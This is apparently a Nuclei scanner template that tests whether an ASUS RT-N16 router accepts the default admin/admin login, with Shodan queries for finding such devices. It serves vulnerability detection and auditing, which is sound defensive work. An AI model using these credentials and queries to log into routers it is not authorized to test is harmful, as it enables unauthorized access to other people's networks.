id: asus-rtn16-default-login

info:
  name: ASUS RT-N16 Default Credentials
  author: ritikchaddha
  severity: high
  description: ASUS RT-N16 default login credentials were discovered.
  classification:
    cpe: cpe:2.3:h:asus:rt-n16:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: asus
    product: rt-n16
    shodan-query:
      - rt-n16
      - cpe:"cpe:2.3:h:asus:rt-n16"
    runzero-match: any(each(service["http.head.wwwAuthentications"]), {# contains 'realm="RT-N16'})
  tags: default-login,asus,rt-n16

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - ASUS
          - RT-N16
          - System Status
          - Network Map
        condition: and

      - type: status
        status:
          - 200

